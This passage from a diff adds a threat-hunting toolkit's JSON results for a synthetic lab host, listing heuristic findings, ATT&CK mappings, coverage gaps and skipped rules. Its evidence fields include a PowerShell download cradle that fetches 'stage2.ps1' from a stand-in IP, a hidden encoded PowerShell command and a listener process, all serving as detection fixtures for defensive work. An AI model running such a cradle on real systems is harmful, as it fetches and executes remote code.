+        "RecommendedNextStep": "Review the full command line and URL, the parent process, and any file the command created. Check network connections for the same PID.",
+        "Remediation": "If the activity is not approved, an authorized responder could contain the host and preserve the downloaded content. This toolkit never changes the system; any action is a manual decision for an authorized responder after validation.",
+        "Limitations": [],
+        "ConfigOverrides": [],
+        "OccurrenceCount": 1,
+        "Suppressed": false,
+        "SuppressionId": null,
+        "SuppressionReason": null
+      },
+      {
+        "FindingId": "WTH-F-eb0ab5c825e4",
+        "Host": "WS-LAB-03",
+        "ObservedAt": "2026-10-16T09:30:00.000Z",
+        "ObservedAtBasis": "CollectionTime",
+        "CollectedAt": "2026-10-16T09:30:00.000Z",
+        "TimeZoneContext": "All timestamps are UTC (ISO 8601).",
+        "RuleId": "WTH-PROC-006",
+        "RuleVersion": "1.0.0",
+        "RuleName": "Download-and-execute pattern in a process command line",
+        "Title": "powershell.exe (PID 6500) contains a download-and-execute pattern",
+        "Category": "Execution",
+        "DataSource": "Process",
+        "Severity": "Medium",
+        "Confidence": "Medium",
+        "FindingType": "Heuristic",
+        "Explanation": "A command line contains an Invoke-Expression download cradle (IEX with DownloadString, Invoke-WebRequest or WebClient), DownloadFile/DownloadString calls, or Start-BitsTransfer from a URL. Fetching and running remote content in memory is a common first-stage technique. Software installers and administrators also use these constructs.",
+        "EvidenceRequirements": [
+          "Process inventory with command lines"
+        ],
+        "Evidence": {
+          "ProcessId": 6500,
+          "Name": "powershell.exe",
+          "ParentName": "powershell.exe",
+          "CommandLine": "powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/stage2.ps1')\"",
+          "CreationTime": "2026-10-16T08:24:00.000Z"
+        },
+        "Attack": [
+          {
+            "Id": "T1059.001",
+            "Name": "Command and Scripting Interpreter: PowerShell",
+            "Tactics": [
+              "Execution"
+            ],
+            "Url": "https://attack.mitre.org/techniques/T1059/001/"
+          },
+          {
+            "Id": "T1105",
+            "Name": "Ingress Tool Transfer",
+            "Tactics": [
+              "Command and Control"
+            ],
+            "Url": "https://attack.mitre.org/techniques/T1105/"
+          }
+        ],
+        "FalsePositives": [
+          "Installers and package managers that use PowerShell web requests",
+          "Administrator bootstrap scripts"
+        ],
+        "RecommendedNextStep": "Identify the URL and the content it served (without fetching it from a production host), the parent process, and network connections for the PID.",
+        "Remediation": "If the activity is not approved, an authorized responder could block the URL at the proxy and contain the host after preserving evidence. This toolkit never changes the system; any action is a manual decision for an authorized responder after validation.",
+        "Limitations": [],
+        "ConfigOverrides": [],
+        "OccurrenceCount": 1,
+        "Suppressed": false,
+        "SuppressionId": null,
+        "SuppressionReason": null
+      },
+      {
+        "FindingId": "WTH-F-64bfa3952498",
+        "Host": "WS-LAB-03",
+        "ObservedAt": "2026-10-16T09:15:00.000Z",
+        "ObservedAtBasis": "EventTime",
+        "CollectedAt": "2026-10-16T09:30:00.000Z",
+        "TimeZoneContext": "All timestamps are UTC (ISO 8601).",
+        "RuleId": "WTH-XDR-001",
+        "RuleVersion": "1.0.0",
+        "RuleName": "Imported event: encoded or download command line",
+        "Title": "Imported event: powershell.exe on WS-LAB-03 has an encoded or download command line",
+        "Category": "Imported",
+        "DataSource": "DefenderXdr",
+        "Severity": "Medium",
+        "Confidence": "Low",
+        "FindingType": "Heuristic",
+        "Explanation": "An imported Defender XDR process event has a command line with an encoded PowerShell argument or a download-and-execute pattern. Advanced hunting exports include process command lines. The same patterns used for live data are applied to the imported rows.",
+        "EvidenceRequirements": [
+          "Imported DeviceProcessEvents-style rows with ProcessCommandLine"
+        ],
+        "Evidence": {
+          "TimeCreated": "2026-10-16T09:15:00.000Z",
+          "DeviceName": "WS-LAB-03",
+          "AccountName": "<user:17c0d5>",
+          "FileName": "powershell.exe",
+          "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
+          "ProcessCommandLine": "powershell.exe -NoP -W Hidden -Enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAeQBuAHQAaABlAHQAaQBjAC0AbABhAGIALQBtAGEAcgBrAGUAcgAnAA==",
+          "InitiatingProcessFileName": "cmd.exe"
+        },
+        "Attack": [
+          {
+            "Id": "T1059.001",
+            "Name": "Command and Scripting Interpreter: PowerShell",
+            "Tactics": [
+              "Execution"
+            ],
+            "Url": "https://attack.mitre.org/techniques/T1059/001/"
+          }
+        ],
+        "FalsePositives": [
+          "Management tooling that uses encoded PowerShell"
+        ],
+        "RecommendedNextStep": "Review the full row in Defender XDR, the device timeline and the initiating process.",
+        "Remediation": "Follow your incident response process in Defender XDR. This toolkit never changes the system; any action is a manual decision for an authorized responder after validation.",
+        "Limitations": [
+          "Exported data, not a live query; completeness depends on what was exported."
+        ],
+        "ConfigOverrides": [],
+        "OccurrenceCount": 1,
+        "Suppressed": false,
+        "SuppressionId": null,
+        "SuppressionReason": null
+      },
+      {
+        "FindingId": "WTH-F-165a5fe343a2",
+        "Host": "WS-LAB-03",
+        "ObservedAt": "2026-10-16T09:18:00.000Z",
+        "ObservedAtBasis": "EventTime",
+        "CollectedAt": "2026-10-16T09:30:00.000Z",
+        "TimeZoneContext": "All timestamps are UTC (ISO 8601).",
+        "RuleId": "WTH-XDR-003",
+        "RuleVersion": "1.0.0",
+        "RuleName": "Imported alert: Medium severity",
+        "Title": "Imported alert: Anomalous Office child process",
+        "Category": "Imported",
+        "DataSource": "DefenderXdr",
+        "Severity": "Medium",
+        "Confidence": "Medium",
+        "FindingType": "Observation",
+        "Explanation": "An imported Defender XDR alert row has severity Medium. See WTH-XDR-002. Medium alerts are surfaced separately so they can be filtered.",
+        "EvidenceRequirements": [
+          "Imported alert rows with Title and Severity"
+        ],
+        "Evidence": {
+          "TimeCreated": "2026-10-16T09:18:00.000Z",
+          "DeviceName": "WS-LAB-03",
+          "AlertId": "da637000000000000001_2",
+          "Title": "Anomalous Office child process",
+          "Severity": "Medium",
+          "Category": "Execution"
+        },
+        "Attack": [],
+        "FalsePositives": [
+          "Alerts triggered by authorized testing"
+        ],
+        "RecommendedNextStep": "Open the alert in Defender XDR and review the evidence.",
+        "Remediation": "Follow your incident response process in Defender XDR. This toolkit never changes the system; any action is a manual decision for an authorized responder after validation.",
+        "Limitations": [
+          "An alert is not an ATT&CK technique mapping."
+        ],
+        "ConfigOverrides": [],
+        "OccurrenceCount": 1,
+        "Suppressed": false,
+        "SuppressionId": null,
+        "SuppressionReason": null
+      },
+      {
+        "FindingId": "WTH-F-99ef9537857f",
+        "Host": "WS-LAB-03",
+        "ObservedAt": "2026-10-16T09:30:00.000Z",
+        "ObservedAtBasis": "CollectionTime",
+        "CollectedAt": "2026-10-16T09:30:00.000Z",
+        "TimeZoneContext": "All timestamps are UTC (ISO 8601).",
+        "RuleId": "WTH-DEF-004",
+        "RuleVersion": "1.0.0",
+        "RuleName": "Windows Defender signatures are stale",
+        "Title": "Defender signatures are 9 days old",
+        "Category": "Defender",
+        "DataSource": "DefenderStatus",
+        "Severity": "Low",
+        "Confidence": "High",
+        "FindingType": "Observation",
+        "Explanation": "Antivirus signatures are seven or more days old. Outdated signatures reduce detection of known threats. This is a hygiene signal, not evidence of an attack.",
+        "EvidenceRequirements": [
+          "Get-MpComputerStatus (AntivirusSignatureAge)"
+        ],
+        "Evidence": {
+          "AntivirusSignatureAgeDays": 9,
+          "AntivirusSignatureLastUpdated": "2026-10-07T09:00:00.000Z",
+          "AMRunningMode": "Normal"
+        },
+        "Attack": [],
+        "FalsePositives": [
+          "Offline or air-gapped systems that update manually",
+          "Machines that were powered off for several days"
+        ],
+        "RecommendedNextStep": "Check connectivity to the update source, WSUS/Intune policy, and whether the host was offline.",
+        "Remediation": "An authorized administrator could trigger a signature update. This toolkit never changes the system; any action is a manual decision for an authorized responder after validation.",
+        "Limitations": [
+          "A stale signature is a hygiene finding without an ATT&CK mapping."
+        ],
+        "ConfigOverrides": [],
+        "OccurrenceCount": 1,
+        "Suppressed": false,
+        "SuppressionId": null,
+        "SuppressionReason": null
+      },
+      {
+        "FindingId": "WTH-F-13d3c5ffb088",
+        "Host": "WS-LAB-03",
+        "ObservedAt": "2026-10-16T09:30:00.000Z",
+        "ObservedAtBasis": "CollectionTime",
+        "CollectedAt": "2026-10-16T09:30:00.000Z",
+        "TimeZoneContext": "All timestamps are UTC (ISO 8601).",
+        "RuleId": "WTH-PROC-001",
+        "RuleVersion": "1.0.0",
+        "RuleName": "Process running from a user-writable path",
+        "Title": "Process beacon.exe (PID 6700) is running from a user-writable path",
+        "Category": "Execution",
+        "DataSource": "Process",
+        "Severity": "Low",
+        "Confidence": "Low",
+        "FindingType": "Heuristic",
+        "Explanation": "A running process has an executable located in a user-writable directory. Malware often executes from locations where it has write access. Many legitimate user-mode applications run from the profile as well, so the rule is intentionally low severity and low confidence and works best as context for other findings.",
+        "EvidenceRequirements": [
+          "Process inventory with executable paths (some paths need an elevated session)"
+        ],
+        "Evidence": {
+          "ProcessId": 6700,
+          "ParentProcessId": 6400,
+          "Name": "beacon.exe",
+          "ExecutablePath": "C:\\Users\\<user:17c0d5>\\AppData\\Local\\Tool\\beacon.exe",
+          "CommandLine": "beacon.exe --listen 4444",
+          "ParentName": "svchost.exe",
+          "CreationTime": "2026-10-16T08:30:00.000Z"
+        },
+        "Attack": [],
+        "FalsePositives": [
+          "Browsers, chat clients, cloud sync tools and developer tools installed per user",
+          "Portable applications"
+        ],
+        "RecommendedNextStep": "Check the file hash and signature, the parent process, the command line and network connections for the same PID. Look for the same path in persistence findings.",
+        "Remediation": "If the process is not approved, an authorized responder could isolate the host and preserve memory and the binary before terminating anything. This toolkit never changes the system; any action is a manual decision for an authorized responder after validation.",
+        "Limitations": [
+          "Running from a writable path is a weak signal on its own, so this rule has no ATT&CK mapping."
+        ],
+        "ConfigOverrides": [],
+        "OccurrenceCount": 1,
+        "Suppressed": false,
+        "SuppressionId": null,
+        "SuppressionReason": null
+      },
+      {
+        "FindingId": "WTH-F-f54cdbdcb39b",
+        "Host": "WS-LAB-03",
+        "ObservedAt": "2026-10-16T09:30:00.000Z",
+        "ObservedAtBasis": "CollectionTime",
+        "CollectedAt": "2026-10-16T09:30:00.000Z",
+        "TimeZoneContext": "All timestamps are UTC (ISO 8601).",
+        "RuleId": "WTH-PROC-001",
+        "RuleVersion": "1.0.0",
+        "RuleName": "Process running from a user-writable path",
+        "Title": "Process svchost.exe (PID 6400) is running from a user-writable path",
+        "Category": "Execution",
+        "DataSource": "Process",
+        "Severity": "Low",
+        "Confidence": "Low",
+        "FindingType": "Heuristic",
+        "Explanation": "A running process has an executable located in a user-writable directory. Malware often executes from locations where it has write access. Many legitimate user-mode applications run from the profile as well, so the rule is intentionally low severity and low confidence and works best as context for other findings.",
+        "EvidenceRequirements": [
+          "Process inventory with executable paths (some paths need an elevated session)"
+        ],
+        "Evidence": {
+          "ProcessId": 6400,
+          "ParentProcessId": 6200,
+          "Name": "svchost.exe",
+          "ExecutablePath": "C:\\Users\\<user:17c0d5>\\AppData\\Local\\Temp\\svchost.exe",
+          "CommandLine": "svchost.exe",
+          "ParentName": "powershell.exe",
+          "CreationTime": "2026-10-16T08:23:00.000Z"
+        },
+        "Attack": [],
+        "FalsePositives": [
+          "Browsers, chat clients, cloud sync tools and developer tools installed per user",
+          "Portable applications"
+        ],
+        "RecommendedNextStep": "Check the file hash and signature, the parent process, the command line and network connections for the same PID. Look for the same path in persistence findings.",
+        "Remediation": "If the process is not approved, an authorized responder could isolate the host and preserve memory and the binary before terminating anything. This toolkit never changes the system; any action is a manual decision for an authorized responder after validation.",
+        "Limitations": [
+          "Running from a writable path is a weak signal on its own, so this rule has no ATT&CK mapping."
+        ],
+        "ConfigOverrides": [],
+        "OccurrenceCount": 1,
+        "Suppressed": false,
+        "SuppressionId": null,
+        "SuppressionReason": null
+      }
+    ],
+    "SuppressedFindings": [],
+    "Coverage": [
+      {
+        "DataSource": "ScheduledTask",
+        "Collector": "ScheduledTasks",
+        "Status": "NotRequested",
+        "ItemCount": 0,
+        "RequiresElevation": "No",
+        "Message": "Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "DataSource": "Service",
+        "Collector": "Services",
+        "Status": "NotRequested",
+        "ItemCount": 0,
+        "RequiresElevation": "No",
+        "Message": "Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "DataSource": "RegistryRun",
+        "Collector": "RegistryRun",
+        "Status": "NotRequested",
+        "ItemCount": 0,
+        "RequiresElevation": "No",
+        "Message": "Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "DataSource": "StartupItem",
+        "Collector": "StartupFolders",
+        "Status": "NotRequested",
+        "ItemCount": 0,
+        "RequiresElevation": "No",
+        "Message": "Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "DataSource": "WmiSubscription",
+        "Collector": "WmiSubscriptions",
+        "Status": "NotRequested",
+        "ItemCount": 0,
+        "RequiresElevation": "Yes",
+        "Message": "Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "DataSource": "LocalAccount",
+        "Collector": "LocalAccounts",
+        "Status": "NotRequested",
+        "ItemCount": 0,
+        "RequiresElevation": "No",
+        "Message": "Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "DataSource": "LocalGroupMember",
+        "Collector": "LocalAccounts",
+        "Status": "NotRequested",
+        "ItemCount": 0,
+        "RequiresElevation": "No",
+        "Message": "Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "DataSource": "Process",
+        "Collector": "Processes",
+        "Status": "Collected",
+        "ItemCount": 10,
+        "RequiresElevation": "No",
+        "Message": "Synthetic data."
+      },
+      {
+        "DataSource": "NetworkConnection",
+        "Collector": "Network",
+        "Status": "Collected",
+        "ItemCount": 4,
+        "RequiresElevation": "No",
+        "Message": "Synthetic data."
+      },
+      {
+        "DataSource": "DefenderStatus",
+        "Collector": "Defender",
+        "Status": "Collected",
+        "ItemCount": 1,
+        "RequiresElevation": "No",
+        "Message": "Synthetic data."
+      },
+      {
+        "DataSource": "DefenderExclusion",
+        "Collector": "Defender",
+        "Status": "NeedsElevation",
+        "ItemCount": 0,
+        "RequiresElevation": "Yes",
+        "Message": "Defender exclusions are only visible to administrators. Re-run elevated to collect them; exclusion rules were not evaluated."
+      },
+      {
+        "DataSource": "DefenderEvent",
+        "Collector": "Defender",
+        "Status": "Collected",
+        "ItemCount": 2,
+        "RequiresElevation": "Maybe",
+        "Message": "Synthetic data."
+      },
+      {
+        "DataSource": "Event.Security",
+        "Collector": "SecurityEvents",
+        "Status": "Collected",
+        "ItemCount": 13,
+        "RequiresElevation": "Yes",
+        "Message": "Synthetic data."
+      },
+      {
+        "DataSource": "Event.PowerShell",
+        "Collector": "PowerShellEvents",
+        "Status": "Collected",
+        "ItemCount": 1,
+        "RequiresElevation": "Maybe",
+        "Message": "Synthetic data."
+      },
+      {
+        "DataSource": "Event.Sysmon",
+        "Collector": "SysmonEvents",
+        "Status": "Unavailable",
+        "ItemCount": 0,
+        "RequiresElevation": "Maybe",
+        "Message": "Not available on this system: Sysmon is not installed or its Operational log does not exist. Rules for this source were not evaluated."
+      },
+      {
+        "DataSource": "DefenderXdr",
+        "Collector": "Import",
+        "Status": "Imported",
+        "ItemCount": 4,
+        "RequiresElevation": "No",
+        "Message": "Imported from file 'defender-xdr-export.json'; 1 row(s) skipped. This is exported data, not a live query."
+      }
+    ],
+    "CoverageGaps": [
+      {
+        "DataSource": "ScheduledTask",
+        "Status": "NotRequested",
+        "Message": "Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "DataSource": "Service",
+        "Status": "NotRequested",
+        "Message": "Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "DataSource": "RegistryRun",
+        "Status": "NotRequested",
+        "Message": "Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "DataSource": "StartupItem",
+        "Status": "NotRequested",
+        "Message": "Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "DataSource": "WmiSubscription",
+        "Status": "NotRequested",
+        "Message": "Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "DataSource": "LocalAccount",
+        "Status": "NotRequested",
+        "Message": "Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "DataSource": "LocalGroupMember",
+        "Status": "NotRequested",
+        "Message": "Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "DataSource": "DefenderExclusion",
+        "Status": "NeedsElevation",
+        "Message": "Defender exclusions are only visible to administrators. Re-run elevated to collect them; exclusion rules were not evaluated."
+      },
+      {
+        "DataSource": "Event.Sysmon",
+        "Status": "Unavailable",
+        "Message": "Not available on this system: Sysmon is not installed or its Operational log does not exist. Rules for this source were not evaluated."
+      }
+    ],
+    "RulesExecuted": [
+      {
+        "RuleId": "WTH-DEF-001",
+        "Version": "1.0.0",
+        "DataSource": "DefenderStatus",
+        "ItemsEvaluated": 1,
+        "ItemsMatched": 1,
+        "FindingCount": 1,
+        "DataSourceStatus": "Collected"
+      },
+      {
+        "RuleId": "WTH-DEF-002",
+        "Version": "1.0.0",
+        "DataSource": "DefenderEvent",
+        "ItemsEvaluated": 2,
+        "ItemsMatched": 1,
+        "FindingCount": 1,
+        "DataSourceStatus": "Collected"
+      },
+      {
+        "RuleId": "WTH-DEF-004",
+        "Version": "1.0.0",
+        "DataSource": "DefenderStatus",
+        "ItemsEvaluated": 1,
+        "ItemsMatched": 1,
+        "FindingCount": 1,
+        "DataSourceStatus": "Collected"
+      },
+      {
+        "RuleId": "WTH-DEF-005",
+        "Version": "1.0.0",
+        "DataSource": "DefenderEvent",
+        "ItemsEvaluated": 2,
+        "ItemsMatched": 1,
+        "FindingCount": 1,
+        "DataSourceStatus": "Collected"
+      },
+      {
+        "RuleId": "WTH-EVT-001",
+        "Version": "1.0.0",
+        "DataSource": "Event.Security",
+        "ItemsEvaluated": 13,
+        "ItemsMatched": 12,
+        "FindingCount": 1,
+        "DataSourceStatus": "Collected"
+      },
+      {
+        "RuleId": "WTH-EVT-002",
+        "Version": "1.0.0",
+        "DataSource": "Event.Security",
+        "ItemsEvaluated": 13,
+        "ItemsMatched": 1,
+        "FindingCount": 1,
+        "DataSourceStatus": "Collected"
+      },
+      {
+        "RuleId": "WTH-EVT-003",
+        "Version": "1.0.0",
+        "DataSource": "Event.Security",
+        "ItemsEvaluated": 13,
+        "ItemsMatched": 0,
+        "FindingCount": 0,
+        "DataSourceStatus": "Collected"
+      },
+      {
+        "RuleId": "WTH-EVT-004",
+        "Version": "1.0.0",
+        "DataSource": "Event.Security",
+        "ItemsEvaluated": 13,
+        "ItemsMatched": 0,
+        "FindingCount": 0,
+        "DataSourceStatus": "Collected"
+      },
+      {
+        "RuleId": "WTH-EVT-005",
+        "Version": "1.0.0",
+        "DataSource": "Event.Security",
+        "ItemsEvaluated": 13,
+        "ItemsMatched": 0,
+        "FindingCount": 0,
+        "DataSourceStatus": "Collected"
+      },
+      {
+        "RuleId": "WTH-EVT-006",
+        "Version": "1.0.0",
+        "DataSource": "Event.PowerShell",
+        "ItemsEvaluated": 1,
+        "ItemsMatched": 1,
+        "FindingCount": 1,
+        "DataSourceStatus": "Collected"
+      },
+      {
+        "RuleId": "WTH-PROC-001",
+        "Version": "1.0.0",
+        "DataSource": "Process",
+        "ItemsEvaluated": 10,
+        "ItemsMatched": 2,
+        "FindingCount": 2,
+        "DataSourceStatus": "Collected"
+      },
+      {
+        "RuleId": "WTH-PROC-002",
+        "Version": "1.0.0",
+        "DataSource": "Process",
+        "ItemsEvaluated": 10,
+        "ItemsMatched": 1,
+        "FindingCount": 1,
+        "DataSourceStatus": "Collected"
+      },
+      {
+        "RuleId": "WTH-PROC-003",
+        "Version": "1.0.0",
+        "DataSource": "Process",
+        "ItemsEvaluated": 10,
+        "ItemsMatched": 1,
+        "FindingCount": 1,
+        "DataSourceStatus": "Collected"
+      },
+      {
+        "RuleId": "WTH-PROC-004",
+        "Version": "1.0.0",
+        "DataSource": "Process",
+        "ItemsEvaluated": 10,
+        "ItemsMatched": 2,
+        "FindingCount": 2,
+        "DataSourceStatus": "Collected"
+      },
+      {
+        "RuleId": "WTH-PROC-005",
+        "Version": "1.0.0",
+        "DataSource": "Process",
+        "ItemsEvaluated": 10,
+        "ItemsMatched": 1,
+        "FindingCount": 1,
+        "DataSourceStatus": "Collected"
+      },
+      {
+        "RuleId": "WTH-PROC-006",
+        "Version": "1.0.0",
+        "DataSource": "Process",
+        "ItemsEvaluated": 10,
+        "ItemsMatched": 1,
+        "FindingCount": 1,
+        "DataSourceStatus": "Collected"
+      },
+      {
+        "RuleId": "WTH-XDR-001",
+        "Version": "1.0.0",
+        "DataSource": "DefenderXdr",
+        "ItemsEvaluated": 4,
+        "ItemsMatched": 1,
+        "FindingCount": 1,
+        "DataSourceStatus": "Imported"
+      },
+      {
+        "RuleId": "WTH-XDR-002",
+        "Version": "1.0.0",
+        "DataSource": "DefenderXdr",
+        "ItemsEvaluated": 4,
+        "ItemsMatched": 1,
+        "FindingCount": 1,
+        "DataSourceStatus": "Imported"
+      },
+      {
+        "RuleId": "WTH-XDR-003",
+        "Version": "1.0.0",
+        "DataSource": "DefenderXdr",
+        "ItemsEvaluated": 4,
+        "ItemsMatched": 1,
+        "FindingCount": 1,
+        "DataSourceStatus": "Imported"
+      },
+      {
+        "RuleId": "WTH-NET-001",
+        "Version": "1.0.0",
+        "DataSource": "NetworkConnection",
+        "ItemsEvaluated": 4,
+        "ItemsMatched": 1,
+        "FindingCount": 1,
+        "DataSourceStatus": "Collected"
+      },
+      {
+        "RuleId": "WTH-NET-002",
+        "Version": "1.0.0",
+        "DataSource": "NetworkConnection",
+        "ItemsEvaluated": 4,
+        "ItemsMatched": 1,
+        "FindingCount": 1,
+        "DataSourceStatus": "Collected"
+      }
+    ],
+    "RulesSkipped": [
+      {
+        "RuleId": "WTH-ACCT-001",
+        "DataSource": "LocalGroupMember",
+        "Optional": false,
+        "Reason": "Data source 'LocalGroupMember' is NotRequested: Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "RuleId": "WTH-ACCT-002",
+        "DataSource": "LocalAccount",
+        "Optional": false,
+        "Reason": "Data source 'LocalAccount' is NotRequested: Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "RuleId": "WTH-ACCT-003",
+        "DataSource": "LocalAccount",
+        "Optional": false,
+        "Reason": "Data source 'LocalAccount' is NotRequested: Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "RuleId": "WTH-DEF-003",
+        "DataSource": "DefenderExclusion",
+        "Optional": false,
+        "Reason": "Data source 'DefenderExclusion' is NeedsElevation: Defender exclusions are only visible to administrators. Re-run elevated to collect them; exclusion rules were not evaluated."
+      },
+      {
+        "RuleId": "WTH-EVT-007",
+        "DataSource": "Event.Sysmon",
+        "Optional": false,
+        "Reason": "Data source 'Event.Sysmon' is Unavailable: Not available on this system: Sysmon is not installed or its Operational log does not exist. Rules for this source were not evaluated."
+      },
+      {
+        "RuleId": "WTH-EVT-008",
+        "DataSource": "Event.Sysmon",
+        "Optional": false,
+        "Reason": "Data source 'Event.Sysmon' is Unavailable: Not available on this system: Sysmon is not installed or its Operational log does not exist. Rules for this source were not evaluated."
+      },
+      {
+        "RuleId": "WTH-EVT-009",
+        "DataSource": "Event.Sysmon",
+        "Optional": false,
+        "Reason": "Data source 'Event.Sysmon' is Unavailable: Not available on this system: Sysmon is not installed or its Operational log does not exist. Rules for this source were not evaluated."
+      },
+      {
+        "RuleId": "WTH-NET-003",
+        "DataSource": "NetworkConnection",
+        "Optional": true,
+        "Reason": "Disabled (rule file or ruleOverrides)."
+      },
+      {
+        "RuleId": "WTH-TASK-001",
+        "DataSource": "ScheduledTask",
+        "Optional": false,
+        "Reason": "Data source 'ScheduledTask' is NotRequested: Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "RuleId": "WTH-TASK-002",
+        "DataSource": "ScheduledTask",
+        "Optional": false,
+        "Reason": "Data source 'ScheduledTask' is NotRequested: Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "RuleId": "WTH-TASK-003",
+        "DataSource": "ScheduledTask",
+        "Optional": false,
+        "Reason": "Data source 'ScheduledTask' is NotRequested: Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "RuleId": "WTH-TASK-004",
+        "DataSource": "ScheduledTask",
+        "Optional": false,
+        "Reason": "Data source 'ScheduledTask' is NotRequested: Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "RuleId": "WTH-SVC-001",
+        "DataSource": "Service",
+        "Optional": false,
+        "Reason": "Data source 'Service' is NotRequested: Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "RuleId": "WTH-SVC-002",
+        "DataSource": "Service",
+        "Optional": false,
+        "Reason": "Data source 'Service' is NotRequested: Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "RuleId": "WTH-SVC-003",
+        "DataSource": "Service",
+        "Optional": false,
+        "Reason": "Data source 'Service' is NotRequested: Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "RuleId": "WTH-SVC-004",
+        "DataSource": "Service",
+        "Optional": false,
+        "Reason": "Data source 'Service' is NotRequested: Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "RuleId": "WTH-REG-001",
+        "DataSource": "RegistryRun",
+        "Optional": false,
+        "Reason": "Data source 'RegistryRun' is NotRequested: Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "RuleId": "WTH-REG-002",
+        "DataSource": "RegistryRun",
+        "Optional": false,
+        "Reason": "Data source 'RegistryRun' is NotRequested: Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "RuleId": "WTH-STARTUP-001",
+        "DataSource": "StartupItem",
+        "Optional": false,
+        "Reason": "Data source 'StartupItem' is NotRequested: Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "RuleId": "WTH-STARTUP-002",
+        "DataSource": "StartupItem",
+        "Optional": false,
+        "Reason": "Data source 'StartupItem' is NotRequested: Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      },
+      {
+        "RuleId": "WTH-WMI-001",
+        "DataSource": "WmiSubscription",
+        "Optional": false,
+        "Reason": "Data source 'WmiSubscription' is NotRequested: Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+      }
+    ],
+    "AttackSummary": [
+      {
+        "Id": "T1027.010",
+        "Name": "Obfuscated Files or Information: Command Obfuscation",
+        "Url": "https://attack.mitre.org/techniques/T1027/010/",
+        "Tactics": [
+          "Defense Evasion"
+        ],
+        "FindingCount": 1
+      },
+      {
+        "Id": "T1036.005",
+        "Name": "Masquerading: Match Legitimate Name or Location",
+        "Url": "https://attack.mitre.org/techniques/T1036/005/",
+        "Tactics": [
+          "Defense Evasion"
+        ],
+        "FindingCount": 1
+      },
+      {
+        "Id": "T1059.001",
+        "Name": "Command and Scripting Interpreter: PowerShell",
+        "Url": "https://attack.mitre.org/techniques/T1059/001/",
+        "Tactics": [
+          "Execution"
+        ],
+        "FindingCount": 4
+      },
+      {
+        "Id": "T1070.001",
+        "Name": "Indicator Removal: Clear Windows Event Logs",
+        "Url": "https://attack.mitre.org/techniques/T1070/001/",
+        "Tactics": [
+          "Defense Evasion"
+        ],
+        "FindingCount": 1
+      },
+      {
+        "Id": "T1105",
+        "Name": "Ingress Tool Transfer",
+        "Url": "https://attack.mitre.org/techniques/T1105/",
+        "Tactics": [
+          "Command and Control"
+        ],
+        "FindingCount": 3
+      },
+      {
+        "Id": "T1110",
+        "Name": "Brute Force",
+        "Url": "https://attack.mitre.org/techniques/T1110/",
+        "Tactics": [
+          "Credential Access"
+        ],
+        "FindingCount": 1
+      },
+      {
+        "Id": "T1204.002",
+        "Name": "User Execution: Malicious File",
+        "Url": "https://attack.mitre.org/techniques/T1204/002/",
+        "Tactics": [
+          "Execution"
+        ],
+        "FindingCount": 1
+      },
+      {
+        "Id": "T1218",
+        "Name": "System Binary Proxy Execution",
+        "Url": "https://attack.mitre.org/techniques/T1218/",
+        "Tactics": [
+          "Defense Evasion"
+        ],
+        "FindingCount": 3
+      },
+      {
+        "Id": "T1562.001",
+        "Name": "Impair Defenses: Disable or Modify Tools",
+        "Url": "https://attack.mitre.org/techniques/T1562/001/",
+        "Tactics": [
+          "Defense Evasion"
+        ],
+        "FindingCount": 2
+      }
+    ],
+    "Warnings": [
+      "Defender XDR import: Row 5 skipped: missing DeviceName",
+      "Defender XDR import: 1 row(s) were skipped because they were malformed or missing required columns.",
+      "Defender XDR import: Ignored unknown column(s): Foo."
+    ],
+    "Limitations": [
+      "SIMULATED DATA: this result was produced from a synthetic snapshot and says nothing about any real endpoint.",
+      "Findings are leads for an analyst, not verdicts. No finding proves compromise, and rules use transparent heuristics that have documented benign causes.",
+      "The absence of findings does not mean the endpoint is clean. Check CoverageGaps and RulesSkipped for data that was not collected.",
+      "Collection is a point-in-time read. Short-lived processes, connections and events outside the configured lookback or removed by log rotation or clearing are not visible.",
+      "The tool runs on the endpoint it inspects. An attacker with administrative control can tamper with the data it reads; corroborate with independent telemetry.",
+      "Redaction of secrets and user names is heuristic. Treat snapshots and reports as sensitive and share them only with authorized responders.",
